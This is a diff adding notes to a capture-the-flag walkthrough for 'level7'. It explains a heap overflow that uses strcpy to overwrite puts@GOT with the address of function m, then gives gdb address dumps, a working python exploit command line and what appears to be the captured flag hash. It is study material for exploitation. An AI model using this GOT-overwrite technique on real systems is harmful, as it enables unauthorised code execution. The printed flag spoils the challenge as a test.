@@ -1,3 +1,19 @@
+in this level the program read the content of the flag file and put it in a global variable,
+this global variable can be printed with m function but it is not called
+but we can notice that we allocate space and then use strcpy on them
+we can then override the the destination of the second strcpy by the address of puts in thr GOT, and give in the second arg the address of function m
+
+(gdb) disass puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:		jmp    *0x8049928
+   0x08048406 <+6>:		push   $0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+(gdb) x 0x8049928
+0x8049928 <puts@got.plt>:	0x08048406
+(gdb) x m
+0x80484f4 <m>:	0x83e58955
+
 ./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1644515087
